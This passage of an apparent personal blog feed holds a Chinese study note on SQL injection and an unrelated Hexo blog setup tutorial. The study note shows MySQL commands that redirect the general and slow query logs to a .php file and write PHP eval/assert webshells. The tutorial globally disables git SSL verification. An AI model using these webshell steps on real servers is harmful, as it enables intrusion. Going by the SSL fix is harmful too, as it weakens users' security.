OFF代表关闭。</p><p><code>general_log_file</code>&#x3D;&#x3D;&gt; 日志的保存路径。</p><p><code>show global variables like &quot;%general_log%&quot;;</code> 查看这两个日志文件相关的配置</p><p><img src="https://bu.dusays.com/2024/05/13/6641605bd88d3.png" alt="image-20240310185353991"></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">D:\phpstudy_pro\Extensions\MySQL5.7.26\data\LAPTOP-R496QJ56.log</span><br></pre></td></tr></table></figure><p>可以看到这里的日志记录状态是处于关闭状态，那么我们需要设置以下使这个选项打开。<br><code>SET GLOBAL general_log=&#39;ON&#39;;</code> 打开日志记录</p><p><img src="https://bu.dusays.com/2024/05/13/6641605b19121.png" alt="image-20240310185455069"></p><p><code>set global general_log_file=&#39;D:、\\phpstudy_pro\\WWW\\log.php&#39;; </code> 设置日志存储路径,写马，这里需要注意的就是需要使用双斜线，然后还有就是日志文件必须是.php文件防止不能被解析</p><p>设置完毕之后就是代表着所有的执行语句都会记录到日志文件当中，不管执行成功与否。</p><p><code>select &#39;&lt;?php assert($_POST[sss]);?&gt;&#39;;</code> 查询语句，其实就是写马，让日志文件众留下这样一句查询语句。那么可以使用这个木马了</p><p><img src="https://bu.dusays.com/2024/05/13/6641605d83b57.png" alt="image-20240310192303309"></p><p>同样 也需要知道文件路径</p><h3 id="慢日志写马"><a href="#慢日志写马" class="headerlink" title="慢日志写马"></a>慢日志写马</h3><p>慢日志全称为慢查询日志（Slow Query Log），主要用来记录在 MySQL 中执行时间超过指定时间的 SQL 语句。通过慢查询日志，可以查找出哪些语句的执行效率低，以便进行优化。</p><p>默认情况下，MySQL 并没有开启慢日志，可以通过修改 slow_query_log 参数来打开慢日志。与慢日志相关的参数介绍如下：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">slow_query_log：是否启用慢查询日志，默认为0，可设置为0、1，1表示开启。</span><br><span class="line">slow_query_log_file：指定慢查询日志位置及名称，默认值为host_name-slow.log，可指定绝对路径。</span><br><span class="line">long_query_time：慢查询执行时间阈值，超过此时间会记录，默认为10，单位为s。</span><br><span class="line">log_output：慢查询日志输出目标，默认为file，即输出到文件。</span><br><span class="line">log_timestamps：主要是控制 error log、slow log、genera log 日志文件中的显示时区，默认使用UTC时区，建议改为 SYSTEM 系统时区。</span><br><span class="line">log_queries_not_using_indexes：是否记录所有未使用索引的查询语句，默认为off。</span><br><span class="line">min_examined_row_limit：对于查询扫描行数小于此参数的SQL，将不会记录到慢查询日志中，默认为0。</span><br><span class="line">log_slow_admin_statements：慢速管理语句是否写入慢日志中，管理语句包含 alter table、create index 等，默认为 off 即不写入。</span><br></pre></td></tr></table></figure><p>一般情况下，我们只需开启慢日志记录，配置下阈值时间，其余参数可按默认配置。对于阈值时间，可灵活调整，比如说可以设置为 1s 或 3s 。</p><p>在配置文件中，我们可以设置以下几个慢日志相关参数：</p><figure class="highlight text"><table><tr><td class="code"><pre><span class="line">慢查询日志相关配置，可根据实际情况修改</span><br><span class="line">vim /etc/my.cnf </span><br><span class="line">[mysqld] </span><br><span class="line">slow_query_log = 1</span><br><span class="line">slow_query_log_file = /data/mysql/logs/slow.log</span><br><span class="line">long_query_time = 1</span><br><span class="line">log_timestamps = SYSTEM</span><br><span class="line">log_output = FILE</span><br></pre></td></tr></table></figure><p>下面我们具体看下，慢日志会记录哪些内容？我们执行一条较慢的查询 SQL ，来看下在慢日志中的体现。</p><figure class="highlight text"><table><tr><td class="code"><pre><span class="line"># 该条SQL执行时间超过阈值</span><br><span class="line"></span><br><span class="line"># Time: 2021-05-13T17:38:03.687811+08:00</span><br><span class="line"># User@Host: root[root] @  [192.168.85.0]  Id: 2604943</span><br><span class="line"># Query_time: 1.099889  Lock_time: 0.000144 Rows_sent: 39  Rows_examined: 45305</span><br><span class="line">SET timestamp=1620898683;</span><br><span class="line">select * from test_table where col_name like &#x27;%测试%&#x27;;</span><br></pre></td></tr></table></figure><p>如果启用了慢速查询日志，并且选择了 FILE 作为输出目标，则写入日志的每个语句都以 # 字符开头。对于每一组慢SQL，第一行记录的是该条 SQL 执行的时刻（如果 log_timestamps 参数为 UTC ，则改时间会显示 UTC 时区时间），第二行记录的是执行该语句的用户和 IP 以及链接 id ，第三行的几个字段解释如下：</p><ul><li><strong>Query_time</strong>: duration 语句执行时间，以秒为单位。</li><li><strong>Lock_time</strong>: duration 获取锁的时间(以秒为单位)。</li><li><strong>Rows_sent</strong>: N 发送给 Client 端的行数。</li><li><strong>Rows_examined</strong>: N 服务器层检查的行数(不计算存储引擎内部的任何处理)。</li></ul><p>下面两行分别是此语句执行时候的时间戳和具体慢 SQL 。</p><p>在实际环境下，不建议开启 log_queries_not_using_indexes 参数，此参数打开后可能导致慢日志迅速增长。对于慢日志的筛选与分析，我们可以借助 mysqldumpslow、pt-query-digest 等工具来分析。对于慢日志文件，要定期进行归档处理，比如可以暂时关闭慢日志，然后将旧文件重命名，之后再开启慢日志，这样就会写入新的日志文件中，有效减小日志体积。</p><p>1.开启日志功能</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">SET GLOBAL slow_query_log_file=&#x27;D:\\phpstudy_pro\\WWW\\shell.php&#x27;;</span><br></pre></td></tr></table></figure><p>2.设置日志存储路径</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">SET GLOBAL slow_query_log_file=&#x27;D:\\phpstudy_pro\\WWW\\shell.php&#x27;;</span><br></pre></td></tr></table></figure><p>3.执行sql语句</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select &#x27;&lt;?php eval($_GET[H])?&gt;&#x27; or SLEEP(11);</span><br></pre></td></tr></table></figure><p>同样需要知道文件路径</p><h1 id="其他数据库"><a href="#其他数据库" class="headerlink" title="其他数据库"></a>其他数据库</h1><p>与前面的mysql的注入方式大同小异</p><h2 id="access数据库"><a href="#access数据库" class="headerlink" title="access数据库"></a>access数据库</h2><p>它的一些主要组件是表格、表单、报告和查询 没有库的概念</p><p><img src="https://bu.dusays.com/2024/05/13/6641605e8b2b8.png" alt="image-20240310132018529"></p><p>也是可以用sql语句查询</p><p>也可以直接找到他的位置下下来</p><p>也就是说access数据库没有information_schema库</p><p>注入：</p><p><img src="https://bu.dusays.com/2024/05/13/6641605df291a.png" alt="image-20240310132912538"></p><p>不同的数据库报错回显不同</p><p>主要靠猜（爆破）</p><p>包括mysql5.0之前都是这样</p><p>通过exists来（有数据为true）</p><p><img src="https://bu.dusays.com/2024/05/13/6641605b3dc70.png" alt="image-20240310134049972"></p><p><img src="https://bu.dusays.com/2024/05/13/6641605b4d1d4.png" alt="image-20240310134114047"></p><p>猜完表名、字段名后猜字段数据长度</p><p>用top函数 top&#x3D;limit</p><p>len&#x3D;lenth</p><p><img src="https://bu.dusays.com/2024/05/13/6641605b270df.png" alt="image-20240310134029761"></p><p>然后猜字段数据内容</p><p><img src="https://bu.dusays.com/2024/05/13/6641605b25a36.png" alt="image-20240310134416367"></p><p>asc&#x3D;ascii mid&#x3D;substr</p><p>也可以使用order by猜字段数目</p><p><img src="https://bu.dusays.com/2024/05/13/6641605bd3271.png" alt="image-20240310135216187"></p><p>然后用union select</p><p><img src="https://bu.dusays.com/2024/05/13/6641605d2d1e0.png" alt="image-20240310140308226"></p><p>mysql跨库查询</p><p>库名.表名</p><p><img src="https://bu.dusays.com/2024/05/13/6641605bc7efa.png" alt="image-20240310140844487"></p><p>access的跨库查询更加苛刻</p><p><img src="https://bu.dusays.com/2024/05/13/6641605ebfb84.png" alt="image-20240310142140165"></p><p>基本不用</p><h2 id="mssql数据库"><a href="#mssql数据库" class="headerlink" title="mssql数据库"></a>mssql数据库</h2><p>全称Microsoftsqlserver</p><p><img src="https://bu.dusays.com/2024/05/13/6641605f18c89.png" alt="image-20240310142314985"></p><p>也是和mysql相似 只是报错信息不同</p><p>order by 3&#x3D;order by 1,2,3</p><p>sqlserver对数据类型严格</p><p>主要使用报错注入</p><p><img src="https://bu.dusays.com/2024/05/13/6641605b4a234.png" alt="image-20240310142928752"></p><p>爆库</p><p><img src="https://bu.dusays.com/2024/05/13/6641605b5340c.png" alt="image-20240310143914302"></p><p><code>&gt;0</code></p><p>也是猜库名</p><p>爆表</p><p><img src="https://bu.dusays.com/2024/05/13/6641605dc2a19.png" alt="image-20240310182447077"></p><p>爆列</p><p><img src="https://bu.dusays.com/2024/05/13/6641605c1498c.png" alt="image-20240310182531770"></p><p>爆数据</p><p><img src="https://bu.dusays.com/2024/05/13/6641605d5c287.png" alt="image-20240310182615415"></p><p>针对mssql不同的权限有不同的注入手法</p>]]></content>
      
      
      <categories>
          
          <category> 学习 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> web </tag>
            
            <tag> 后端漏洞 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>博客搭建</title>
      <link href="/2024/05/12/%E5%8D%9A%E5%AE%A2%E6%90%AD%E5%BB%BA/"/>
      <url>/2024/05/12/%E5%8D%9A%E5%AE%A2%E6%90%AD%E5%BB%BA/</url>
      
        <content type="html"><![CDATA[<p>这里我使用hexo搭建的个人博客</p><h2 id="准备"><a href="#准备" class="headerlink" title="准备"></a>准备</h2><p>下载[nodejs](<a href="https://nodejs.org/en/">Node.js — 随处运行 JavaScript (nodejs.org)</a>)</p><p>我是一路next</p><p><img src="https://bu.dusays.com/2024/05/12/6640e6da99016.png" alt="image-20240502162734610"></p><p>下载[git](<a href="https://git-scm.com/downloads">Git - Downloads (git-scm.com)</a>)</p><p>一样next</p><p><img src="https://bu.dusays.com/2024/05/12/6640e6d9d4313.png" alt="image-20240502163015637"></p><blockquote><p>node -v</p><p>npm -v</p><p>git -v</p></blockquote><p>下载hexo</p><p>用管理员身份打开cmd</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">npm install hexo-cli -g</span><br></pre></td></tr></table></figure><p><img src="https://bu.dusays.com/2024/05/12/6640e6d9a17df.png" alt="image-20240502163428108"></p><h2 id="搭建仓库"><a href="#搭建仓库" class="headerlink" title="搭建仓库"></a>搭建仓库</h2><p>成功下载好工具之后，我们开始搭建GitHub存储静态页面的仓库</p><p>登录github</p><p>新建一个仓库</p><p><img src="https://bu.dusays.com/2024/05/12/6640e6d9d65f0.png" alt="image-20240502163854157"></p><p>名字必须是账户名.github.io</p><p>要public</p><p>勾选 Add a README file</p><p><img src="https://bu.dusays.com/2024/05/12/6640e6da81881.png" alt="image-20240502170815788"></p><p><img src="https://bu.dusays.com/2024/05/12/6640e6d9b6803.png" alt="image-20240502170927546"></p><h2 id="生成SSH-key"><a href="#生成SSH-key" class="headerlink" title="生成SSH key"></a>生成SSH key</h2><p>git执行</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ssh-keygen -t rsa -C &quot;邮件地址&quot;</span><br></pre></td></tr></table></figure><p><img src="https://bu.dusays.com/2024/05/12/6640e6dc24a18.png" alt="image-20240502171118745"></p><p><img src="https://bu.dusays.com/2024/05/12/6640e6dbbfba3.png" alt="image-20240502171219549"></p><p>一直回车(4次)</p><p><img src="https://bu.dusays.com/2024/05/12/6640e6dadf6ba.png" alt="image-20240502171259459"></p><p>找到生成的文件</p><p><code>C:\Users\admin\.ssh</code></p><p><img src="https://bu.dusays.com/2024/05/12/6640e6da4487b.png" alt="image-20240502171410100"></p><p>用任意文件编辑器打开id_rsa.pub</p><p>全选复制</p><p>在github的setting中打开ssh</p><p>新建一个ssh key</p><p>把刚刚复制的粘贴进去</p><p><img src="https://bu.dusays.com/2024/05/12/6640e6daabd0a.png" alt="image-20240502171802709"></p><p>创建</p><p>验证：<br>打开git </p><p>输入<code>ssh -T git@github.com</code></p><p>我这里报错：<br><img src="https://bu.dusays.com/2024/05/12/6640e6d9a8c51.png" alt="image-20240502172545147"></p><p><strong>解决：</strong></p><p>错误提示的是连接**<code>github.com</code>**的22端口被拒绝了。可以简单理解为此门不通，既然这个端口号走不通，那换一个端口号试试看</p><p>直接在该文件夹下新建config.txt文件，将下面的命令直接粘贴进去,保存退出后，把此文件的.txt后缀删除（重命名）</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Host github.com</span><br><span class="line">  Hostname ssh.github.com</span><br><span class="line">  Port 443</span><br></pre></td></tr></table></figure><p>再试  后跟yes</p><p><img src="https://bu.dusays.com/2024/05/12/6640e6dac9377.png" alt="image-20240502173004790"></p><p>成功</p><h2 id="本地生成博客内容"><a href="#本地生成博客内容" class="headerlink" title="本地生成博客内容"></a>本地生成博客内容</h2><p>再任意位置新建文件夹</p><p>打开 git</p><p>输入</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">hexo init</span><br></pre></td></tr></table></figure><p>初始化</p><p><img src="https://bu.dusays.com/2024/05/12/6640e6d9d0284.png" alt="image-20240502173529224"></p><p>报错 前面加了npx也一样</p><p><strong>解决：</strong><br>错误： git SSL certificate problem: unable to get local issuer certificate</p><blockquote><p>这个问题是由于没有配置信任的服务器HTTPS验证。默认，<a href="https://so.csdn.net/so/search?q=cURL&spm=1001.2101.3001.7020">cURL</a>被设为不信任任何CAs，就是说，它不信任任何服务器验证</p></blockquote><p>执行：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">git config --global http.sslVerify false</span><br></pre></td></tr></table></figure><p>再初始化 即可</p><p><img src="https://bu.dusays.com/2024/05/12/6640e6ec522a1.png" alt="image-20240502174237835"></p><p>成功</p><p>然后安装</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">hexo install</span><br></pre></td></tr></table></figure><p><img src="https://bu.dusays.com/2024/05/12/6640e6da3976c.png" alt="image-20240502174432493"></p><p>接下来依次输入</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">hexo g     生成</span><br><span class="line">hexo s     本地部署</span><br></pre></td></tr></table></figure><p><img src="https://bu.dusays.com/2024/05/12/6640e6d9d447c.png" alt="image-20240502174535921"></p><p><img src="https://bu.dusays.com/2024/05/12/6640e6d9c949f.png" alt="image-20240502174621298"></p><p>给的这个URL就是在本地部署的博客</p><p>给的这个localhost:4000 端口被占用了 请求被拒绝</p><p>改一下端口</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">hexo s -p 5000</span><br></pre></td></tr></table></figure><p><img src="https://bu.dusays.com/2024/05/12/6640e6dbab3cf.png" alt="image-20240502175245789"></p><p><img src="https://bu.dusays.com/2024/05/12/6640e71393770.png" alt="image-20240502175220172"></p><p>成功</p><h2 id="上线博客"><a href="#上线博客" class="headerlink" title="上线博客"></a>上线博客</h2><p>进入之前的Blog文件夹，用打开_config.yml</p><p>划到最后</p><p><img src="https://bu.dusays.com/2024/05/12/6640e6d9b1792.png" alt="image-20240502175505659"></p><p>将最后的tpye:”改为：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">type: git</span><br><span class="line">repository: </span><br><span class="line">branch: main</span><br></pre></td></tr></table></figure><p><img src="https://bu.dusays.com/2024/05/12/6640e6d9c3ebc.png" alt="image-20240502175611545"></p><p>注意首行缩进</p><p>回到github</p><p>把仓库的连接复制过来</p><p>粘贴到repository后面</p><p><img src="https://bu.dusays.com/2024/05/12/6640e6da9fc16.png" alt="image-20240502175921333"></p><p>在博客文件夹中打开git</p><p>执行</p><blockquote><p>hexo g     生成</p><p>hexo d     上传</p></blockquote><p><img src="https://bu.dusays.com/2024/05/12/6640e6dac3183.png" alt="image-20240502180349908"></p><p>这里我也是报错了</p><p><strong>解决</strong></p><p>要在<strong>站点目录</strong>下执行以上安装<code>hexo-deployer-git</code>插件的命令，所谓站点目录就是执行<code>hexo init</code>的目录</p><p>执行：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">npm install hexo-deployer-git --save</span><br></pre></td></tr></table></figure><p><img src="https://bu.dusays.com/2024/05/12/6640e6d99b973.png" alt="image-20240502180656958"></p><p>再执行hexo d</p><p><img src="https://bu.dusays.com/2024/05/12/6640e6d9d73c6.png" alt="image-20240502180732852"></p><p><img src="https://bu.dusays.com/2024/05/12/6640e6dd1eaba.png" alt="image-20240502180825885"></p><p>成功</p><p>访问vvkladg0r.github.io</p><p><img src="https://bu.dusays.com/2024/05/12/6640e6dc7a03c.png" alt="image-20240502180922779"></p><p>成功</p><h2 id="Vercel部署"><a href="#Vercel部署" class="headerlink" title="Vercel部署"></a>Vercel部署</h2><p>Github提供的网址在国内的访问速度较慢，所以推荐在搭建完后用<a href="https://vercel.com/">Vercel</a>部署，再通过Vercel绑定到自己的域名上，这样会速度会很快。</p><p>因为Vercel给我们分配的域名在国内是无法访问的，所以我们需要把在Vercel部署的绑定到自己的域名上，这样就可以访问了。</p><p>这里大家可以选择购买域名</p><p>用 github连接Vercel账号</p><p>点击右上角的<code>Add New Project</code>创建新的项目，之后导入选项那里选择<code>Continue with Github</code>，这时候应该能看到你Github账号的仓库，选择你刚刚部署成功的存储静态博客的仓库<code>&lt;username&gt;.github.io</code>右边的<code>Import</code>选项，表示你要导入该仓库。</p><p>起一个只能有小写字母、数字或者或者连字符的项目名称，然后其他默认，点击<code>Deploy</code>，等待一分钟即可部署成功</p><p><img src="https://bu.dusays.com/2024/05/12/6640e6ecc9c89.png" alt="image-20240505153802912"></p><p>部署成功</p><p>然后点<code>Continue to Dashboard</code></p><p><img src="https://bu.dusays.com/2024/05/12/6640e71ad5b7b.png" alt="image-20240505154312979"></p><p>成功</p><p>是我们现在还不能访问他给出的域，因为GFW把Vercel屏蔽了</p><p>绑定自定义域名：</p><p>点控制器里的Domains </p><p>查看当前的域，我们可以看到仅有Vercel给你预分配的一个域名，此时我们输入我们要用的域名，添加后他会提示你添加一条DNS解析记录。</p><p><img src="https://bu.dusays.com/2024/05/12/6640e6dae9ca5.png" alt="image-20240505154919950"></p><p>接下来在域名解析记录里面添加记录，其中记录类型对应<code>Type</code>，主机记录对应<code>Name</code>，记录值对应<code>Value</code>，其他的设置默认即可。</p><p><img src="https://bu.dusays.com/2024/05/12/6640e6dca9f65.png" alt="image-20240505161023476"></p><p>我这里是腾讯云：</p><p><img src="https://bu.dusays.com/2024/05/12/6640e6da4fde0.png" alt="image-20240505161336615"></p><p><img src="https://bu.dusays.com/2024/05/12/6640e6dab3e86.png" alt="image-20240505161357741"></p><p>成功</p><p><img src="https://bu.dusays.com/2024/05/12/6640e71199af3.png" alt="image-20240505161435423"></p><p>可以用自定义域名访问了</p><p>当你有了新的域名之后，需要将<code>[BlogRoot]\_config.yml</code>文件中的<code>url</code>配置项改为自己的新域名，这样博客的文章链接才会正确生成。</p><p><img src="https://bu.dusays.com/2024/05/12/6640e6d9df4bc.png" alt="image-20240505194744268"></p><h2 id="主题安装"><a href="#主题安装" class="headerlink" title="主题安装"></a>主题安装</h2><p>这里我选择的是安知鱼主题</p><p><a href="https://docs.anheyu.com/">安知鱼主题</a>一款基于Butterfly主题修改的主题</p><p>这里还有很多<a href="https://hexo.io/themes/">hexo主题</a></p><p>我们根据它的官方文档安装</p><p>下载主题：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">git clone -b main https://github.com/anzhiyu-c/hexo-theme-anzhiyu.git themes/anzhiyu</span><br></pre></td></tr></table></figure><p>在Blagfile文件中用vscode打开</p><p><img src="https://bu.dusays.com/2024/05/12/6640e6da4f282.png" alt="image-20240506140626319"></p><p>在vscode中打开终端 执行命令</p><p><img src="https://bu.dusays.com/2024/05/12/6640e6dacae57.png" alt="image-20240506141151070"></p><p>theme文件夹下出现了安知鱼的相关文件</p><p>这是主题的源码 以后更新的时候会覆盖所以源码 不是很方便</p><p>覆盖配置可以使<code>主题配置</code>放置在 anzhiyu 目录之外，避免在更新主题时丢失自定义的配置。</p><p>所以执行：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cp -rf ./themes/anzhiyu/_config.yml ./_config.anzhiyu.yml</span><br></pre></td></tr></table></figure><p>将主题的配置文件移出来</p><p>但是这是在linux&#x2F;mac下才能执行的命令</p><p>而我们window需要：</p><p>复制<code>/themes/anzhiyu/_config.yml</code>此文件到 hexo 根目录，并重命名为<code>_config.anzhiyu.yml</code></p><p><img src="https://bu.dusays.com/2024/05/12/6640e6da14661.png" alt="image-20240506142216602"></p><p>修改hexo主题配置</p><p>将_config.yml文件中的theme属性修改为anzhiyu</p><p><img src="https://bu.dusays.com/2024/05/12/6640e6da7a13b.png" alt="image-20240506142308758"></p><p>安装 pug 和 stylus 渲染插件:</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">npm install hexo-renderer-pug hexo-renderer-stylus --save</span><br></pre></td></tr></table></figure><p>报错了：</p><p><img src="https://bu.dusays.com/2024/05/12/6640e6da00822.png" alt="image-20240506143045345"></p><p>解决：</p><p>根据他的提示先更新一下版本呢：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">npm install -g npm@10.7.0</span><br></pre></td></tr></table></figure><p><img src="https://bu.dusays.com/2024/05/12/6640e6d9d8dee.png" alt="image-20240506143215947"></p><p>行</p><p>再跑一下刚刚的命令呢</p><p><img src="https://bu.dusays.com/2024/05/12/6640e6db15c1a.png" alt="image-20240506143438304"></p><p>好像没有问题了</p><p>本地启用一下hexo看看呢</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">hexo cl</span><br><span class="line">hexo g</span><br><span class="line">hexo s</span><br></pre></td></tr></table></figure><p><img src="https://bu.dusays.com/2024/05/12/6640e6e73642e.png" alt="image-20240506143728560"></p><p>网页无变化 说明没安起</p><p>换一条命令呢：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">npm install hexo-renderer-pug hexo-renderer-stylus --save --registry=http://registry.npmmirror.com</span><br></pre></td></tr></table></figure><p>也有回显</p><p><img src="https://bu.dusays.com/2024/05/12/6640e6d9ee8ec.png" alt="image-20240506144534900"></p><p>再部署看看</p><p><img src="https://bu.dusays.com/2024/05/12/6640e6da074c9.png" alt="image-20240506144650106"></p><p>这次好像可以了</p><p><img src="https://bu.dusays.com/2024/05/12/6640e6da74907.png" alt="image-20240506144735874"></p><p><img src="https://bu.dusays.com/2024/05/12/6640e6da55dc1.png" alt="image-20240506144754684"></p><p>应该没问题了</p><p>访问一下看看呢</p><p><img src="https://bu.dusays.com/2024/05/12/6640e703e6482.png" alt="image-20240506144857627"></p><p>行 本地访问没有问题</p><p><img src="https://bu.dusays.com/2024/05/12/6640e7030081b.png" alt="image-20240506144941111"></p><p>自定义域名访问没变</p><p>解决：</p><p>可能是更新花了一点时间</p><p>现在访问就是没问题的</p><p><img src="C:\Users\admin\AppData\Roaming\Typora\typora-user-images\image-20240506150442185.png" alt="image-20240506150442185"></p><h2 id="网站配置"><a href="#网站配置" class="headerlink" title="网站配置"></a>网站配置</h2><p>一般都在<code>_config.yml</code>中修改</p><p><img src="https://bu.dusays.com/2024/05/12/6640e6da13fe9.png" alt="image-20240506151958836"></p><p>主题的相关配置的话在<code>_config.anzhiyu.yml</code>里面 大家就自行修改吧</p><p><a href="https://docs.anheyu.com/">安知鱼官方配置文档</a></p><h2 id="上传文章"><a href="#上传文章" class="headerlink" title="上传文章"></a>上传文章</h2><p>我们在Blog文件夹中打开git bash,输入下方代码就可以生成新的文章md文件</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">hexo new 文章标题</span><br></pre></td></tr></table></figure><p><img src="https://bu.dusays.com/2024/05/12/6640e48e8bcd0.png" alt="image-20240512234724501"></p><p>文章是.md格式，在我们的Blog文件夹中的source&#x2F;_posts中</p><p><img src="https://bu.dusays.com/2024/05/12/6640e4e4793a0.png" alt="image-20240512234851152"></p><p>然后我们用Typora软件打开该.md文件就可以开始写文章了</p><p>Front-matter</p><p><code>Front-matter</code> 是 markdown 文件最上方以<code>---</code>分隔的区域，用于指定个别档案的变数。</p><ul><li>Page Front-matter 用于页面配置</li><li>Post Front-matter 用于文章页配置</li></ul><p>如果标注可选的参数，可根据自己需要添加，不用全部都写</p><p><strong>Page Front-matter：</strong></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">MARKDOWN</span><br><span class="line"></span><br><span class="line">---</span><br><span class="line">title:</span><br><span class="line">date:</span><br><span class="line">updated:</span><br><span class="line">type:</span><br><span class="line">comments:</span><br><span class="line">description:</span><br><span class="line">keywords:</span><br><span class="line">top_img:</span><br><span class="line">mathjax:</span><br><span class="line">katex:</span><br><span class="line">aside:</span><br><span class="line">aplayer:</span><br><span class="line">highlight_shrink:</span><br><span class="line">---</span><br></pre></td></tr></table></figure><table><thead><tr><th align="left">写法</th><th>解释</th></tr></thead><tbody><tr><td align="left">title</td><td>【必需】页面标题</td></tr><tr><td align="left">date</td><td>【必需】页面创建日期</td></tr><tr><td align="left">type</td><td>【必需】标籤、分类和友情链接三个页面需要配置</td></tr><tr><td align="left">updated</td><td>【可选】页面更新日期</td></tr><tr><td align="left">description</td><td>【可选】页面描述</td></tr><tr><td align="left">keywords</td><td>【可选】页面关键字</td></tr><tr><td align="left">comments</td><td>【可选】显示页面评论模块(默认 true)</td></tr><tr><td align="left">top_img</td><td>【可选】页面顶部图片</td></tr><tr><td align="left">mathjax</td><td>【可选】显示mathjax(当设置mathjax的per_page: false时，才需要配置，默认 false)</td></tr><tr><td align="left">kates</td><td>【可选】显示katex(当设置katex的per_page: false时，才需要配置，默认 false)</td></tr><tr><td align="left">aside</td><td>【可选】显示侧边栏 (默认 true)</td></tr><tr><td align="left">aplayer</td><td>【可选】在需要的页面加载aplayer的js和css,请参考文章下面的音乐 配置</td></tr><tr><td align="left">highlight_shrink</td><td>【可选】配置代码框是否展开(true&#x2F;false)(默认为设置中highlight_shrink的配置)</td></tr></tbody></table><p><strong>Post Front-matter：</strong></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">MARKDOWN</span><br><span class="line"></span><br><span class="line">---</span><br><span class="line">title:</span><br><span class="line">date:</span><br><span class="line">updated:</span><br><span class="line">tags:</span><br><span class="line">categories:</span><br><span class="line">keywords:</span><br><span class="line">description:</span><br><span class="line">top_img:</span><br><span class="line">comments:</span><br><span class="line">cover:</span><br><span class="line">toc:</span><br><span class="line">toc_number:</span><br><span class="line">toc_style_simple:</span><br><span class="line">copyright:</span><br><span class="line">copyright_author:</span><br><span class="line">copyright_author_href:</span><br><span class="line">copyright_url:</span><br><span class="line">copyright_info:</span><br><span class="line">mathjax:</span><br><span class="line">katex:</span><br><span class="line">aplayer:</span><br><span class="line">highlight_shrink:</span><br><span class="line">aside:</span><br><span class="line">---</span><br></pre></td></tr></table></figure><table><thead><tr><th>写法</th><th>解释</th></tr></thead><tbody><tr><td>title</td><td>【必需】文章标题</td></tr><tr><td>date</td><td>【必需】文章创建日期</td></tr><tr><td>updated</td><td>【可选】文章更新日期</td></tr><tr><td>tags</td><td>【可选】文章标籤</td></tr><tr><td>categories</td><td>【可选】文章分类</td></tr><tr><td>keywords</td><td>【可选】文章关键字</td></tr><tr><td>description</td><td>【可选】文章描述</td></tr><tr><td>top_img</td><td>【可选】文章顶部图片</td></tr><tr><td>cover</td><td>【可选】文章缩略图(如果没有设置top_img,文章页顶部将显示缩略图，可设为false&#x2F;图片地址&#x2F;留空)</td></tr><tr><td>comments</td><td>【可选】显示文章评论模块(默认 true)</td></tr><tr><td>toc</td><td>【可选】显示文章TOC(默认为设置中toc的enable配置)</td></tr><tr><td>toc_number</td><td>【可选】显示toc_number(默认为设置中toc的number配置)</td></tr><tr><td>toc_style_simple</td><td>【可选】显示 toc 简洁模式</td></tr><tr><td>copyright</td><td>【可选】显示文章版权模块(默认为设置中post_copyright的enable配置)</td></tr><tr><td>copyright_author</td><td>【可选】文章版权模块的文章作者</td></tr><tr><td>copyright_author_href</td><td>【可选】文章版权模块的文章作者链接</td></tr><tr><td>copyright_url</td><td>【可选】文章版权模块的文章连结链接</td></tr><tr><td>copyright_info</td><td>【可选】文章版权模块的版权声明文字</td></tr><tr><td>mathjax</td><td>【可选】显示mathjax(当设置mathjax的per_page: false时，才需要配置，默认 false)</td></tr><tr><td>katex</td><td>【可选】显示katex(当设置katex的per_page: false时，才需要配置，默认 false)</td></tr><tr><td>aplayer</td><td>【可选】在需要的页面加载aplayer的js和css,请参考文章下面的音乐 配置</td></tr><tr><td>highlight_shrink</td><td>【可选】配置代码框是否展开(true&#x2F;false)(默认为设置中highlight_shrink的配置)</td></tr><tr><td>aside</td><td>【可选】显示侧边栏 (默认 true)</td></tr></tbody></table><p>写好以后，我们还是一样打开git bash生成、上传</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">hexo g</span><br><span class="line">hexo d</span><br></pre></td></tr></table></figure><h2 id="问题解决"><a href="#问题解决" class="headerlink" title="问题解决"></a>问题解决</h2><p>在网站配置这里遇到了相当多的问题 有些问题很快解决了 有些就真的花了很多时间</p><h3 id="访问-about路由-回显配置的md文档"><a href="#访问-about路由-回显配置的md文档" class="headerlink" title="访问&#x2F;about路由 回显配置的md文档"></a>访问&#x2F;about路由 回显配置的md文档</h3><p>这是这个博客搭建遇到的最大的问题 </p><p>我按照anzhiyu官网文档搭建关于页面</p><p>搭好了访问发现不能访问yaml的前端页面 只能访问它的配置页面</p><p>这个问题我卡了两三天</p><p>这个问题出现的原因主要是配置文档存在隐藏字符 因为这个文档不是直接生成的 我是从别的博客上复制了一部分下来 所以有隐藏字符 </p><p>这里最好是直接生成 或者手打 复制的话要检查有没有隐藏字符</p><h3 id="hexo-d时遇到的问题"><a href="#hexo-d时遇到的问题" class="headerlink" title="hexo d时遇到的问题"></a>hexo d时遇到的问题</h3><p>主要就是这个</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">FATAL Something&#x27;s wrong. Maybe you can find the solution here: https://hexo.io/docs/troubleshooting.html</span><br><span class="line">Error: Spawn failed</span><br><span class="line">    at 